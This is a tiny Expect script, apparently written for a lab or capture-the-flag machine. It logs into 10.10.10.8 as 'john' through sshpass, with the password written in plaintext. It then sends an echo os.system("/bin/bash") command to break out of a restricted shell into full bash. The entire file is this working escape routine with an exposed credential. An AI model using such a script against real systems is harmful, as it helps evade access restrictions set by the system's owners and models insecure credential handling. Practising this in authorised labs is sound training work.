#!/usr/bin/expect
spawn sshpass -p MyNameIsJohn ssh john@10.10.10.8
expect "john:~$";
send "echo os.system(\"/bin/bash\")\n";
interact
